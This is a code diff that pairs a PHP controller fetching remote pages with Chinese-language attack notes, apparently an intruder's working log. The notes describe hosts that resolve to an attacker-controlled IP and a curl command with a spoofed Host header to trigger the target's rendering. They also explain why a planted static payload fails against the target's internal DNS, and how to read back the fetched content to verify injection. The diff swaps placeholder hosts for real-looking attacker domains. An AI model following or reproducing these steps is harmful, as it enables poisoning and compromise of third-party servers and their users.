@@ -42,9 +42,9 @@
 class OrderAction extends Action{
   public function get_html1(){
     $rs = rand(11111,99999);
-    $urlapp = "http://baexample".$rs."target397.example.com/List/getapp_html/type/1";
-    $url    = "http://target396.example.com/List/index/type/0";
-    $url1   = "http://target398.example.com/List/index/type/1";
+    $urlapp = "http://baexample".$rs."ht.admin.jbg.example.abrdns.com/List/getapp_html/type/1";
+    $url    = "http://vggexamplec.posforjijigo.admin.jbg.example.abrdns.com/List/index/type/0";
+    $url1   = "http://bahexamplet.posforjijigo.admin.jbg.example.abrdns.com/List/index/type/1";
     $content  = file_get_contents($url);
     $content1 = file_get_contents($url1);
     if(strlen($content) > 100){
@@ -105,11 +105,11 @@ for f in jquery3_5.txt jquery3_6.txt attime3_5.txt; do
 done
 
 # ④ 触发渲染必须用「不含 sp、不含 example」的 Host
-curl -k -s --noproxy '*' -H "Host: target393.example.com" "$T/example.com?g=Home&m=Index&a=index" | md5sum
+curl -k -s --noproxy '*' -H "Host: zsm1girvry.mrummy2rbv.xyz" "$T/example.com?g=Home&m=Index&a=index" | md5sum
 ```
 
 ## 3. ★ 陷阱 1：抓取源不是公网 DNS 能指到的那台
-`*.target395.example.com` 是**通配名**，203.0.113.133/203.0.113.1/203.0.113.97/203.0.113.32/203.0.113.136 全部把这批名字解析到**我方已控的 203.0.113.22**；
+`*.abrdns.com` 是**通配名**，203.0.113.133/203.0.113.1/203.0.113.97/203.0.113.32/203.0.113.136 全部把这批名字解析到**我方已控的 203.0.113.22**；
 但目标机 **不用公网 DNS**（本机 hosts / 内网 DNS → 集群内真实节点）。
 ⇒ 在 116 上植 `/List/index/type/0` 静态 payload **对目标完全无效**。
 **判定方法**：跑一次 get_html1，然后回读 `/Upload/atop/jquery3_5.txt`（= `file_get_contents($urlapp)` 的原样内容）。
